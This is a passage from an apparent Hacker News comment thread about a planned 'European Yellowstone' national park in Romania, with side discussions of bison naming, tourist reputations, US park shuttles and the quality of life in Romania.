wild. Stealing human food is just generally easier and tastier. reply Rinzler89 17 hours agorootparentprev> they'll come down and steal from your garbage in town You mean their home? Bears were there before humans settled and built towns. IMHO can't really complain about bears wehen you're the on encroaching on their turf, not the other way around. reply NikolaNovak 16 hours agorootparentI never understand these arguments. You mean mastodon home,surely? They were there before bears! How about pterodactyl? How far do we go / where do we arbitrarily draw the line? I am all for ecology, preservation, being in sync with nature etc, but I find fundamentally flawed and dishonest arguments like these don't contribute to the cause. Over billions of years, every single species alive displaced some other species, multiple times over. reply mlyle 16 hours agorootparentI think he's just saying that if you move in somewhere where there were lots of bears.... don't be surprised when bears show up and are annoying. reply s1artibartfast 16 hours agorootparentThe \"surprise“ comes from the fact this was historically a solved problem. People simply killed the annoying predators and nuisance animals. We are in a transition state of cultural values and expectations. People expect to being free from annoyances because that was the norm for hundreds if not thousands of years. The rules have changed around how we treat animals, but people have not internalized all the resulting impacts. For what it is worth, there are still lots of places, even in the US, where the old solution is still in effect. reply rsdfdfdfdf 14 hours agorootparentHistorically there were much less humans, and more wilderness for animals. Applying the historical solutions in modern day would mean extinction of species in many places. reply s1artibartfast 14 hours agorootparentThat may be true for some species, and not others. However, I was not attempting an appeal to history, just providing explanation. After all, historically, most people did not care about the extinction of many species, or even thought their eradication was a benefit. reply Rinzler89 16 hours agorootparentprevThis. I just said humans should not complain about bear issues when they settle in bear territory. Don't know why others need to get their knickers in a twist. reply keiferski 15 hours agorootparentprevThe point of this argument is to compare humans with animals they replaced, not animals with other animals, because the assumption is that we, as humans, are ethically capable of engaging with this kind of question in the first place. I don't think anyone is arguing that \"the land belongs to the bears and no one else.\" reply generic92034 16 hours agorootparentprev> Over billions of years, every single species alive displaced some other species, multiple times over. I can mostly agree with the rest of your points. But how many species are killing off thousands of other species in such a short time frame? reply NikolaNovak 16 hours agorootparentAnd that's absolutely an argument I will support! and very much do care about. It's just a fundamentally different argument to \"Well clearly, arbitrary species A here at some arbitrary time B is the natural and morally right owner of these lands\". reply digging 15 hours agorootparentWere bears completely extinct in the area and reintroduced from elsewhere? If not, there's no arbitrary line being drawn whatsoever. It's currently bear habitat. reply generic92034 16 hours agorootparentprevAs long as this is not seen as justification to displace any other species just when we feel like it (because they probably displaced some other species), I can agree. reply kelnos 12 hours agorootparentprev> \"Well clearly, arbitrary species A here at some arbitrary time B is the natural and morally right owner of these lands\". Which is not what the person you replied to said. I read it as \"bears were there first, don't be surprised when you move there and find bears\". reply dylan604 15 hours agorootparentprev> where do we arbitrarily draw the line? clearly, a line is if both species are alive at the same time and competing for resources. we don't have do be moronic/sophomoric about the discourse. reply mixmastamyk 16 hours agorootparentprevWhile I’d probably vote to shoo the bears, I don’t think the argument is particularly hard to understand. Like the folks who build their house at the bottom of a flood plain or fire area and then demand help for ensuing disaster. reply greenpresident 17 hours agoprevI randomly know some people who did research on the relationships between the stakeholders that are involved here. See: https://www.tandfonline.com/doi/full/10.1080/08941920.2021.1... I find the whole thing facinating. reply pfdietz 18 hours agoprevHave you ever seen the movie Cold Mountain? The story was set in the Appalachians, but the movie was filmed in the mountains of Romania. Beautiful. reply alistairSH 16 hours agoparentI don't think the Carpathians look much like Appalachia - I'll have to check the film out and see. reply HarHarVeryFunny 17 hours agoprevThe more the better, but there's already a \"European Yellowstone\" in the form of Belovezhskaya Pushcha National Park in Belarus, of similar size, home to many of the remaining European buffalo. reply aix1 16 hours agoparentI'm guessing you mean the bison. (At least that's what Belovezhskaya Pushcha is known for, other than being the largest area of primeval forest in Europe.) reply jameshart 15 hours agorootparentCalling bison ‘buffalo’ is a North American thing, generally. It’s part of a huge pattern of naming confusions between British and American English for ungulates. An elk in Eurasia traditionally means what is a called a moose in North America, but in North America what they call an elk is more similar to a European red deer. America also calls its pronghorn (which is not an antelope) an antelope, and its reindeer caribou, unless they’re pulling Santa’s sleigh. Muskoxen also aren’t oxen. But the bighorn sheep is really a sheep and it does have big horns, so they have that going for them. reply Ichthypresbyter 13 hours agorootparentNot just English. The Dutch word for Alces alces (the animal called a moose in North America and an elk in Europe) is \"eland\". Dutch settlers in South Africa decided to use that word for the large antelope of the genus Taurotragus, which is still called an eland in English. Modern Dutch distinguishes the two by calling the antelope an \"eland antelope\", while Afrikaans calls the moose/elk an \"American/European eland\". reply HarHarVeryFunny 13 hours agorootparentprevYeah, but I'm an ex-Brit, so that's not really a good excuse :) My wife's Belarusian though, and I have been to Belovezhskaya Pushcha and seen these buffalo/bison beasties, so I've got that going for me! reply Shatnerz 15 hours agorootparentprevBuffalo and Bison are often interchangeable in American English. I know in Polish, \"żubr\", which is the European Bison, is often translated as buffalo and the American Bison is known as \"bizon\" which is understandably translated as bison. I would not be surprised if Belarusian was similar. reply aix1 4 hours agorootparentIn Belarusian it's indeed \"амерыканскі бізон\" and \"еўрапейскі зубр\" (American bison and European zubr). In everyday speech these are shortened to \"bison\" and \"zubr\". And buffalo (like African and water) is \"буйвал\". I had no idea American English used \"buffalo\" and \"bison\" interchangeably. Learn something every day. :) reply hnbad 15 hours agorootparentprevCorrect. Buffalo and wisent are both bison. reply joshuaissac 15 hours agorootparent> Buffalo and wisent are both bison. There are also buffalo that are not bison, like the domestic water buffalo. https://en.wikipedia.org/wiki/Water_buffalo reply hasoleju 12 hours agoprevThis really sounds too good to be true. I understand why the locals are sceptic at first. If they achieve their goal of creating a national park with 200.000 square hectares they have covered 3% of the Romanian forests. That is impressive. reply sidewndr46 9 hours agoprevIsn't this mostly negated by the fact that Romania is a sovereign state? If a group was to buy up enough land that it started to affect the economy of the region, the government could just void out their rights to the land. Or reduce them to only a minimal level. reply Ylpertnodi 18 hours agoprevAhh, bollocks (sort of)! Romania...one of the last cool places on earth that isn't full of idiots. Oh well, gotta go find somewhere else again. *packs of dogs can be a pain....especially whilst cycling. reply TulliusCicero 17 hours agoparentAre you...upset at nature preservation? reply rrr_oh_man 17 hours agorootparentNo, US-American tourists reply TulliusCicero 17 hours agorootparentAs a frequent reader of r/europe, Americans have FAR from the worst reputation for tourists within Europe, it's not even close. At least among larger countries, they might actually have a better than average rep. reply rrr_oh_man 16 hours agorootparentI don't dislike US-Americans. Very far from it. Most US-Americans that I have encountered (both abroad and stateside) are a lovely bunch, great tippers, and have a distinct happy-go-lucky attitude that is hard to find anywhere else. The crux: When a place gets popular with a certain tourist demographic (through Instagram, Tiktok, whatever) there is an inflection point where the place / experience starts to become commodified, expensive, and bad. Similar to an influx of large amounts VC money in that niche community app that you used to love. reply kelnos 12 hours agorootparent> US-Americans You can just say \"Americans\". It's a well-recognized demonym, everyone knows what it means, and no one is going to be confused and think you mean someone from one of the many other countries in North or South America. And it's not some sort of \"injustice\" that the US \"stole\" the term American to refer to solely themselves. It's just... not a big deal. reply rrr_oh_man 12 hours agorootparent> It's just... not a big deal. Says the thief? ;) reply cactusplant7374 14 hours agorootparentprevI like how the first thing you mention liking is Americans giving you extra money. reply rrr_oh_man 14 hours agorootparentWhy 'me'? reply AcedCapes 16 hours agorootparentprevIt would be interesting to see some kind of data on this. I have a mutual friend that does tours in Europe. This was his and his worker's sentiments as well. Talking with them we thought there may be a lot of self-filtering going on in his situation. He does historical tours and those seem to attract a less rowdy group. reply giantg2 17 hours agorootparentprevI'd love to see the research behind that. I don't know where Americans rank, but I wouldn't guess we rank high. reply TulliusCicero 17 hours agorootparentFrom what I've read: American tourists in Latin America fucking suck, but the ones that go to Europe or Japan are largely fine. Anyway, it's easy to find threads about tourists on r/europe or r/askeurope: https://www.reddit.com/r/AskEurope/comments/6zq6lu/which_for... reply alistairSH 16 hours agorootparentprevPersonal experience from travel in Iceland, Peru, UK (mostly Scotland), and Italy. Obviously generalizations and anecdotes, so take with a grain of salt. Americans often stand out. Look more \"touristy\" - wearing shorts, goofy bags, unstylish footwear, etc. Most likely to ask \"what do you do?\" (for a living). Not rude, but can be more boisterous/social than some others. Chinese - tend to travel in large tour groups. Frequently dressed poorly for conditions (Jimmy Choo shoes while touring Icelandic waterfalls). Disembark from buses and race to get a selfie before the rest of the crowd. Not purposefully rude, but the sheer number/concentration of them makes them stand out. Europeans are generally don't stand out. Usually dress the least obviously touristy. Usually happy to make chit-chat, but less likely to initiate than US-Americans. And stupid people come from all backgrounds. While in Iceland, there was an Asian fellow who insisted on sticking his hand into the geysers, despite warning signs in ~8 languages. Same trip, some German teens ran out onto an icy lake, despite signs warning of falling through the ice. And at the big waterfalls, there were people from all races/nationalities jumping fences to get better shots for their Insta feeds. My personal pet peeve is people who litter or otherwise ruin natural beauty. And again, they come in all shapes, sizes, colors, creeds, etc. reply kelnos 12 hours agorootparent> Americans often stand out. Look more \"touristy\" - wearing shorts, goofy bags, unstylish footwear, etc. Interesting. When I travel, I usually dress the same out in public as I do at home (well, modified for the local weather, anyway). Usually that means jeans, t-shirt, and possibly a hoodie and/or jacket if the weather is cooler, with fairly plain sneakers or perhaps a nicer shoe, depending on how much walking I expect to be doing. I tend to not carry a bag with me unless I'm going to or from an airport or train station. If I do need a bag, it'll usually be a backpack or shoulder bag, something I would use at home for a similar purpose. I do expect that there are a lot of us who inexplicably dress differently when traveling, but I wonder if your assessment of American tourist dress as \"goofy\" or \"unstylish\" is just that the styles that are popular over here aren't popular where you live and where you've traveled and seen American tourists. I really don't get why some people drastically change their wardrobe when traveling, though. reply alistairSH 8 hours agorootparentI’m American, from DC metro. Shorts are a big one - far more popular in the US than abroad. Particularly cargo shorts, which are goofy no matter who you are. ;) reply willsmith72 17 hours agorootparentprevBetter than who out of curiosity? reply TulliusCicero 17 hours agorootparentThe ones that get slammed the most that I've seen are probably the Brits, Russians, and Chinese. Apparently Brits are notorious for getting super drunk and fucking around. Russians are known as being really entitled and rude (and sometimes aggressive IIRC), and there's Chinese tourists also being rude and ignoring rules in huge packs. The stereotype of American tourists is that they're ignorant and loud (and bad dressers), but also friendly, curious, great tippers (which makes Americans very popular among hospitality workers), and mostly rule-abiding. Though the bad ones are often REALLY bad. Best reputation is the Japanese. Almost everyone says they're super polite and respectful. reply willsmith72 17 hours agorootparentTrue, and Americans tend to stick to tourist traps, you don't find at many of them at random Slovenian lakes. A young group of brits abroad can be found anywhere and everywhere reply bombcar 16 hours agorootparentprev> great tippers This covers a multitude of sins, because the most likely person to be annoyed by tourists are the workers who interact with them. reply hnbad 14 hours agorootparentprevThe stereotypes around Russian and Chinese tourists have a lot to do with relative wealth, I think. If you're from Russia or China and you decide to go to Europe (or in the case of Russia more specifically Western Europe) for a vacation, you are likely fairly well-off in your home country even if your relative wealth doesn't necessarily translate to the country you're visting. This comes with a certain sense of entitlement typical of \"new money\". The part about Russians being more aggressive (I'd even say more likely to credibly threaten violence) might have to do with the level of corruption in Russia making it more likely for you to get away with even violent crime if you can afford it. At least this would match what Russian ex-pats I've met say about their home country. I'd say American tourists in Europe are generally relatively well-behaved because they're conscious of how they might be perceived (remember the travel advice to pretend you're Canadian?) but e.g. in Germany they're often known for being noisy, which is generally seen as rude. I've heard a lot of complaints about American tourists \"talking too loud\" even in regular conversation, and the heavy use and expectation of \"social smiling\" (i.e. feigning friendliness as courtesy) can be extremely off-putting. reply kjkjadksj 17 hours agorootparentprevProbably british youths on holiday, they are pretty notorious. This demographic of american is just as bad but can only afford to get belligerent domestically in florida or south padre isle during spring break, much less afford a flight to europe. reply TulliusCicero 17 hours agorootparentExactly, shitty American tourists are staying within America or going to Mexico/nearby Latam countries. reply kelnos 12 hours agorootparentRight, and this is why I believe American tourists (in general) have a much worse reputation in Latin America than in Europe. reply seattle_spring 10 hours agorootparentI think the Americans with bad reputations tend to stick to tropical climates and beaches. The type of place where tourists are probably just sunning themselves or getting drunk. Interestingly enough, I recently went on a short trip to Cozumel, MX. It wasn't my choice, I was just going to see some family who had planned their vacation there. I've been to more than 20 countries and boy oh boy was Cozumel my least favorite place abroad. Felt like the whole island was tailor-made to rip off or outright scam tourists arriving via cruise ships. reply rrr_oh_man 5 hours agorootparentThat is exactly the sentiment that I was trying to convey with my, admittedly a bit controversial, statement above. reply IncreasePosts 13 hours agorootparentprevDo you get a lot in Romania? I would suspect there's about 15 other more popular countries in Europe for Americans to visit... The UK, Ireland, Spain, France, Italy, Portugal, Germany, Austria, Switzerland, Czechia, Greece, Turkey, Netherlands, etc are all more popular to go to as an American than Romania. reply kelnos 12 hours agorootparentThe implication was that a new big national park would attract annoying tourists. (A different poster suggested American, but there are certainly annoying tourists from many places in the world.) reply keybored 15 hours agorootparentprevIf the US has such awesome national parks (and I believe it) then they don’t have to fly across an ocean to get that Yellowstone experience. reply rrr_oh_man 15 hours agorootparentThe people are extremely welcome, yet the market forces that come with mass tourism are often very destructive. reply tasuki 11 hours agoparentprevI cycled along the Danube (all of it) in 2013. The packs of wild dogs were not a problem at all. The individual dogs \"defending\" their property from cyclists were a pain. I had a water bottle and a stick to get rid of the less and the more persistent ones respectively... reply anon291 12 hours agoprevSay what you like about America but our public lands are worth more than all the crown jewels of Europe. reply burkaman 12 hours agoparentI could be wrong but I'm guessing nearly every European would agree that their own national parks are also worth more than their crown jewels. reply krapp 12 hours agoparentprevAnd ironically, both were stolen from the people who owned them. reply anon291 3 hours agorootparentNo one cares. reply junaru 15 hours agoprevCall me pessimist but (emphasis mine): > We can only buy from private property, but not from municipalities or landowners’ associations, so our strategy is to acquire what we can and donate it to the state *only if it creates a national park* So foreign \"donors\" are buying land that they gonna keep if local government doesn't do what they want. reply jameshart 14 hours agoparentThere’s a bit of a trend of foreign meddling trying to preserve Carpathian landscapes - King Charles III of Great Britain has been at it too: https://www.rferl.org/a/romania-king-charles-trees-transylva... Powerful aristocrats and mysterious patrons buying up parts of Transylvania to ensure the preservation of the old ways? Sounds like the background to a Dan Brown novel… reply BuffaloBagel 13 hours agoprevThe Gorongosa project in Mozambique has revitalized Gorongosa National Park while involving local communities. https://en.wikipedia.org/wiki/Gorongosa_National_Park reply jderick 18 hours agoprevMaybe they can create one without all the traffic. reply bombcar 18 hours agoparentJust go to any other part of the park; though the other parts are not as \"interesting\". Visit the Zone of Death! Almost completely empty! https://en.wikipedia.org/wiki/Zone_of_Death_(Yellowstone) reply samatman 18 hours agorootparentThe Zone of Death isn't quite a classic \"HN tries to compile the law\" topic, lawyers have tried to have the boundaries rewritten after all. But what would happen if/when a felony is committed in the Zone of Death is fairly clear. A local judge would rule that \"State and district\" needs to be interpreted in the intention of the legislature, and can only be \"State or district\" when those differ, since \"neither State nor district\" isn't going to lead to a \"fair and speedy trial\". But this opens a wedge for appeal on procedural grounds, which any defense lawyer would be duty-bound to take, and the whole thing would end up in front of the Supreme Court. Which is a waste of everyone's time, SCOTUS should be creating meaningful precedent with its limited time, not futzing around with the one spot on the map where the Sixth Amendment is ambiguous. What wouldn't happen is the perpetrator going scot-free. That's not how it works. It's a cool name though. Very in keeping with the West in general. reply someguydave 14 hours agorootparentYeah it always seemed unlikely that “the law does not apply” conclusion makes sense there when judges regularly “nope” less solid procedural arguments out of their courts. reply bombcar 16 hours agorootparentprevThe only case that gets close to it was resolved (in part) by the perpetrator taking a plea deal that included the guarantee that they would NOT petition for redress. reply hnbad 15 hours agorootparentGiven how the US legal system works in practice, a plea deal is also the most likely outcome for any other felony. Playing for time isn't really a good idea when that translates to extremely long jail times while waiting for a trial you're not going to win anyway. reply hollywood_court 17 hours agorootparentprevThis reminds of “Free Fire” by C.J. Box. reply bombcar 16 hours agorootparentOne of the novels written to try to get Congress to fix the technical issue. reply justrealist 18 hours agorootparentprevI buy this for Yosemite but let's be real, if I'm going to Yellowstone I'm taking my toddlers to see the geysers, not on a 20 mile in-and-out hike up a mountain. reply bombcar 17 hours agorootparentOf course - though there are other geysers available (most in Yellowstone, of course): https://en.wikipedia.org/wiki/List_of_geysers Popular things are popular for reasons, after all. The best I've found is visit at inconvenient times; early or late in the season, or early in the day. reply wbl 16 hours agorootparentWas just in Yosemite: the mountains look just as pretty with snow and you can snowshoe from Badger Pass. reply burkaman 17 hours agoparentprevI haven't been to Yellowstone so maybe this doesn't make sense, but is there a reason they couldn't implement the same system as Zion? During most of the year the main road in Zion is closed to private cars, and everyone uses the (very good) shuttle system, or bikes or walks. reply jhj 16 hours agorootparentI live near Yellowstone in Wyoming. The park is a lot more massive than Zion, usually involving multi-hour drives to get around, and there are multiple roads in the park, all of which don't necessarily see the same levels of traffic. There also tend to not be as many people driving around slowly gawking on the roads themselves (unlike Zion or Yosemite, say), since most of the park doesn't have crazy vista views, it's mainly a high altitude, flat-ish volcanic plateau in the middle. The specific sites along the roads will have the traffic mostly. reply sib 16 hours agorootparentprevZion (the parts people see, at least), is tiny by comparison. Also, as a photographer, the shuttle system is pretty awful. It's no longer easily possible to do get out to where you want to be well before dawn. reply sofixa 17 hours agorootparentprevI did a trip through a bunch of national parks recently, and was thinking why the hell isn't there some sort of organised transit - be it shuttle busses, or trains for the capacity. The amount of space wasted for parking in a nature preserve was crazy, not to mention all the infrastructure for the traffic jams. Then went to Grand Canyon and Zion and saw they have shuttles which are sometimes exclusive (if the shuttle is operating you cannot take the road), which makes so much more sense, and even allows for more flexibility (you can go on a hike which is out, and not have to walk back the same way but hop on the shuttle bus). reply burkaman 17 hours agorootparentI don't know why it isn't more common, especially when most parks have a relatively short main road/loop that 90% of visitors never leave. Yosemite for example has a great bus system that goes everywhere you need, except that they don't block private cars so the buses constantly get stuck in traffic. I think the exclusive shuttles at Zion are relatively new, so maybe it will spread to more parks in the future. reply HDThoreaun 17 hours agorootparentprevZions shuttle system frankly blows. I went last week and had to wait 2 hours in line for it. Meanwhile you go to the kobol canyon area and I did not see a single person all day. reply thousandautumns 11 hours agorootparentMust vary widely, because I went in August and there was 0 line at all. A lot of places are on Spring Break in the US right now, so that may contribute to your experience. reply dendrite9 16 hours agorootparentprevI think Yellowstone is too big for that compared to places like Zion and Yosemite which have relatively small valleys where people concentrate. I'm not sure shuttles to see Tioga Pass would make sense in the same way they do in the valley. reply marssaxman 13 hours agorootparentThere is in fact a high country shuttle operating in the Tuolomne Meadows area. It makes four stops per day at Tioga Pass: https://www.nps.gov/yose/planyourvisit/tmbus.htm reply ProllyInfamous 18 hours agoparentprevYellowstone is an animal watching experience... so watch all the humans in their animal-ing. reply orthoxerox 15 hours agoprevI am disappointed they didn't plan to drill for geysers. Geothermal activity is the first thing that comes to mind when I hear \"Yellowstone\". reply fred_is_fred 13 hours agoparentI was also confused when I read this. Yellowstone has bears and buffalo, but that's not why it was made a park. reply malermeister 18 hours agoprevTransylvania is absolutely stunning. There's a trek called the Via Transilvanica that's on my bucket list: https://youtu.be/5gpbns_jqRY?si=TxGZXN6rCH2IQOoM reply UberFly 17 hours agoprevPrivate money is what kicked off the National Parks system in the US. Glad to see this happening anywhere. I hope it stays in the public trust though. reply shafyy 16 hours agoparentThere are already tons of national parks in Europe, it's not like this is the first one. reply bavent 17 hours agoparentprevReally? I thought it was Terry Roosevelt. Do you have a source? reply 1970-01-01 16 hours agorootparentIt was Teddy. Via executive orders. https://www.smithsonianmag.com/history/how-theodore-roosevel... reply bombcar 16 hours agorootparentHe came way later - it began much earlier: https://en.wikipedia.org/wiki/History_of_the_National_Park_S... You have to look at the history of each individual park, some started out as government land and remained such, others were private resort islands, etc. reply 1970-01-01 15 hours agorootparentI suppose it comes down to your definition of kicked off. There were only a few lands protected as national parks before Teddy arrived and protected more land than any other individual has ever done. reply jameshart 14 hours agorootparentprevBut often with the support or lobbying of private interests. Generous souls like Lorrin A. Thurston of Hawaii, who would like you to remember him as the newspaper publishing philanthropist who used his wealth to promote his interest in volcanology and persuade Roosevelt to create the Volcanoes National Park. Which is true - in 1916, the park was established by Woodrow Wilson (helped by Teddy’s endorsement). But the same kind of private interest taking an interest in the affairs of state has its dark side too: Thurston also was the author of the “bayonet constitution” which undermined the Kingdom of Hawaii's sovereignty, and formed the ‘committee of safety’ which enlisted the US Marines in a coup that overthrew Queen Liliʻuokalani, and installed Sanford Dole (the fruit guy) as and President, and ultimately brought about the annexation of Hawaii. reply sib 16 hours agorootparentprevYellowstone National Park - 1872 Sequoia National Park - 1890 Yosemite National Park - 1890 Teddy Roosevelt - president from 1901 - 1909 reply bombcar 16 hours agorootparentRoosevelt's Time Machine was well known. reply underlipton 16 hours agorootparentprevI don't know the history, but if it's anything like the public libraries here (and several other institutions), a lot of it would have been bankrolled by robber barons trying to secure their legacy and avoid taxation. In other words, guilting rich people and threatening nationalization of their wealth works. reply WalterBright 16 hours agorootparent> a lot of it would have been bankrolled by robber barons trying to secure their legacy and avoid taxation. Do you have a cite for that? BTW, donating to charity is tax deductible. For example, if I donate $100 to charity, I can deduct $100 from my taxable income. My choices: 1. paying taxes: I pay $20 2. donating to charity and deducting it from my income: I pay $100 I'm $80 worse off financially by donating to charity rather than paying taxes. As a tax avoidance scheme, donating to charity doesn't deliver. reply hnbad 14 hours agorootparentThat's a very naive understanding of how charities work. You don't donate to a charity, you donate to your charity. Now, obviously your charity still needs to act as a charity so that money can't go back in your pocket but there are plenty of things the charity might spend it on that are in your financial interest and because you founded it, you likely have sufficient influence over it to make that happen even if you don't formally personally make its decisions. Also, if you donate $100 in stock to a charity, that deducts your taxable income by $100 but it doesn't cost you $100 in income. Arguably a more egregious example for this is high art where you can create and destroy value through auctions (i.e. the value of your donation may be massively inflated compared to what you paid for it). reply WalterBright 12 hours agorootparent> there are plenty of things the charity might spend it on that are in your financial interest How do you think Carnegie's libraries across the country benefited Carnegie financially? reply underlipton 13 hours agorootparentprevI might have overstated how common it was, after a bit of Googling. https://www.washingtonpost.com/news/retropolis/wp/2018/04/09... https://scholarlycommons.pacific.edu/cgi/viewcontent.cgi?art... reply paul7986 14 hours agoprevI have only been to Iceland (jan 2023..first time out of the US and loved it's culture & many things about it) then in May 2023 visited Yellowstone. Iceland has a lot of natural wonders but Yellowstone has more varied natural wonders and all in a smaller area. I'd personally recommend Yellowstone over Iceland if your looking to experience the best/most unique natural wonders (grand canyon, tons of waterfalls, a massive geyser Old Faithful compared to Stokkur, wildlife safari, hot and colorful out of this world scolding hot pools and more). I do need to do the ring road in Iceland, but Iceland surely does not have wildlife nor colorful hot pools (that i know of anyway). reply rsynnott 16 hours agoprevOh, as in a big park. Not a supervolcano. Fine, then, carry on. reply budududuroiu 18 hours agoprevVisiting Romania :) Living in Romania :( reply Rinzler89 16 hours agoparentRomanians complain more about their country than people from Africa, Syria or Afganistan. Most pessimistic bunch ever. Not that life in Romania is excelent, but the Romanians who complain a lot only look at Netherlands, Sweden, Denmark, etc and forget most of the world has it vastly worse than them. reply cozzyd 15 hours agorootparentI think you can stop your sentence after the third word. (source: am Romanian) reply kabes 13 hours agorootparentI have some Romanian colleagues and they're all quite patriotic and often talk about how great Romania is. reply namaria 1 hour agorootparentThat's universal. You don't trash your homeland to foreigners, only to fellow countrymen. reply jterrys 16 hours agorootparentprevThe latter two don't really have the internet to complain about their country though reply Rinzler89 16 hours agorootparentI'm talking about in-person complaining as I met a lot of people from those countries and none complained as much as Romanians. And assuming those people don't have internet is just silly. reply Perz1val 15 hours agorootparentprevPost communism reply alecsm 17 hours agoparentprevLiving in Romania is not that bad if you make enough money but living there with the median income is complicated that's why many of us are living abroad. Quality of life has increased dramatically since the 90s though. reply 6502nerdface 16 hours agoparentprevIt's noticeably improving, though! Over the last 10 years or so, both their GDP per capita and household income per capita have roughly doubled. Now when I visit medium-sized cities there I am amazed to find latte-slinging coffee shops and craft beer-pouring gastropubs that would look right at home in Brooklyn. reply Rinzler89 16 hours agorootparent>Now when I visit medium-sized cities there I am amazed to find latte-slinging coffee shops and craft beer-pouring gastropubs that would look right at home in Brooklyn. True, but that's not an accurate measurement of the quality of life or income of the average Romanian. They're are just businesses serving an afluent urban clientele (mostly corporate/IT workers and other high income people) that's like what 10% of the național population or something but overly represented in much higher proportions in the big cities. Go to the smaller cities or villages and you'll see a different picture: lots of people with precarious education, unemployed or making minimum wage in dead-end jobs and living paycheck to paycheck unable to afford to fix broken teeth, hospitals and schools falling apart, etc. The country's still much better to live in (especially in the 5 big cities) than what the average of the planet has to deal with, but there's a reason why statistically it's at the bottom of the EU charts. Tech workers sipping gourmet coffee in the big cities are the exception but don't represent the norm. reply rrr_oh_man 17 hours agoparentprevI beg to differ reply ethbr1 17 hours agorootparentWhat are the pros and cons? reply budududuroiu 17 hours agorootparentPros (imo): Daily essentials not-yet commodified, can access amazing produce for cheap. Geopolitically stable, crime is mostly petty or white collar. Nature. Cons (imo): no progressive tax rate, effective ~50% tax on income unless you want to do tax evasion (Romanian past-time), very likely to die on the road as public transit is in a state of disrepair, choice of healthcare between expensive and inefficient private sector, or a public sector where you have to bribe your way to not contracting infections while getting treated for something else. reply Rinzler89 16 hours agorootparent> expensive and inefficient private sector Interesting, I found the private sector to be better there than in western Europe. Much quicker, easier and cheaper to get a cehck-up, MRI, CT scan, physiotherapy, dentistry, etc. The public system though, yeah, it's rough. reply xandrius 17 hours agorootparentprevCons (imo) definitely outweigh the pros though. reply bad_user 16 hours agorootparentprevNot having a progressive tax is a feature, not a bug. If a progressive tax would be introduced, I'd either start avoid taxes in any way possible, or I'd seriously think about emigration. Because yes, the rich always finds ways to evade taxes, while the middle class gets screwed. And I'm also not interested in subsidizing the poor. The total taxes you pay on a regular work contract are around 41.5%, and much of that goes to pensions. Many people in the gig economy, that haven't contributed, will wake up one day to a harsh reality. The public healthcare system mostly works, even if underfunded and with problems. In Bucharest we benefited from treatments and expertise that would be very expensive out of pocket or difficult to find. Private healthcare is mostly a hoax, much like private education (in this country), stop paying for it. Bribery is much less common. Still happens, but you can also get in trouble. We barely have any homeless people, all the shopping malls are full, and home ownership is very high. Official stats can be misleading. Our politicians are incompetents, that's true, but we are in NATO, we are in EU, we are a regional power, and we avoided far-right strongmen or communists thus far. Many Romanians have emigrated, lifting the economy actually, and also many came back. Since the shock of the 90s, the country's economy became really fluid. Unfortunately, Romanians are some of the most pessimist people. reply mhitza 16 hours agorootparent> The total taxes you pay on a regular work contract are around 41.5%, and much of that goes to pensions. With VAT on each purchase (unless you're not living month to month, and are able to set aside some of your income) the effective taxation is closer to 60%. I don't want to go into the topic of why I think progressive taxation is better than what we have now, but I wanted to raise this point because many stop at the tax rate on their salary. reply budududuroiu 16 hours agorootparentprevPensions in Romania are a joke, ask your relatives that recently retired. Can I remind you that out of the immediate survivors of the Colectiv fire, 70% of them contracted hospital-acquired infections? (Which were conveniently overlooked by the coroner) Private healthcare is a hoax that most employers can and will redirect their contribution to, further increasing the hole in which the public sector is getting into. Bribery isn’t less common, it’s just becoming increasingly inaccessible to common folk. Police is still in cahoots with “businessmen”. Health and safety authorisations are still handed out like hotcakes to the ones in the inner circle. -> https://www.romania-insider.com/investigations-and-dismissal... Our malls are full but industry is dead. We’re a consumer economy We’re part of NATO, oh so proud of it, yet barely scrape together an impotent 1.6% of GDP for our defence. Our navy is in such bad state that in NATO joint exercises foreign soldiers training with us thought our ship was on fire (it wasn’t, just badly maintained and burning with a thick black smoke). I also find it funny that you say we “avoided communists” and “home ownership is high” in the same breath. I wonder why home ownership is that high, and what policy lead to that. reply Rinzler89 15 hours agorootparent>Can I remind you that out of the immediate survivors of the Colectiv fire, 70% of them contracted hospital-acquired infections That is indeed terrible, but as another who emigrated west I realized, malpraxis is rampant here as well, it just doesn't make it into the news as much. Incompetent doctors and medical whoopsies can kill me here as well even if the system is overall better. reply bad_user 15 hours agorootparentprev> Pensions in Romania are a joke, ask your relatives that recently retired. Both my parents have decent pensions. It's directly proportional to your contributions. Small lifetime contributions, small pension. Nowadays, a part of those contribution also gets invested, and my current net worth would actually allow me to retire right now. > Bribery isn’t less common, it’s just becoming increasingly inaccessible to common folk. Bribery being less accessible literally means that it's less common, but maybe we aren't speaking the same language. Local police is more corruptible, but try bribing DIICOT, see how well that works out. Also, in general, there have been many cases in which people got caught taking bribes, so, depending on who you try bribing, you can be kicked out of the room, or contacted by authorities. Colective was a tragedy. But it was also a hyped news story by all tabloids. My son suffered from Lylle's syndrome when he was 1-year-old, also treated at one of the hospitals where they treat burned victims. He was also born premature at 30 weeks with 1.2 Kg. My mother was operated for acute pancreatitis, which at that time had a 70% death rate. I have an aunt that's a cancer survivor. Both me and my father had several surgeries in our public hospitals. And I don't practice bribery. Take from this what you will. > \"Our malls are full but industry is dead. We’re a consumer economy\" Yet we are producing and exporting more than ever, with the GDP going through the roof, adjusted for inflation. What in the world is a \"consumer economy\" anyway? I hear these same words from my father, a common myth, but he has the excuse that he was a communist party member. What's yours? > \"I also find it funny that you say we “avoided communists” and “home ownership is high” in the same breath. I wonder why home ownership is that high, and what policy lead to that.\" During communism home ownership was nearly zero, as everything was owned by the state. And nowadays Bucharest is in the top cities when it comes to affordable housing when reported to the number of average salaries needed to buy a home. City planning is poor, nearly non-existent in places, but Romania builds plenty of housing, which makes it affordable, with some exceptions. Do you still live in Romania? And if you do, do you know the country you're living in? :-) reply UncleEntity 15 hours agorootparentprev> I wonder why home ownership is that high, and what policy lead to that. Post-Soviet privatization? If I had to guess... reply Rinzler89 14 hours agorootparentRomania was never soviet. reply huytersd 16 hours agorootparentprevInteresting. I guess the impression that a lot of people have of Romania is that it is riddled with violent crime. reply gniv 13 hours agorootparentprevIt really depends on your personality. If you're used to the niceties of the west, you may be frustrated by many things in Romania. The infrastructure is still behind. If you're more laid back you adapt and learn to enjoy. Being healthy helps a lot. reply rrr_oh_man 17 hours agorootparentprevPro: Amazing nature, you can do whatever you want, entrepreneurial spirit, great Gbit (!!!) WiFi everywhere, lovely people Con: Bad streets, derelict villages, corrupt politics, low trust reply maelito 16 hours agoprevPlease do this in France too. So much land, but agriculture everywhere. reply slau 13 hours agoparentThere’s a moment in the movie R.M.N. where a young Frenchman is in town to “count the bears”. During a town hall, he tries to explain that he’s there to help identify how many bears there are and help protect them. One local throws a jab back at him: “You kill all the bears in your country and reap the benefits of 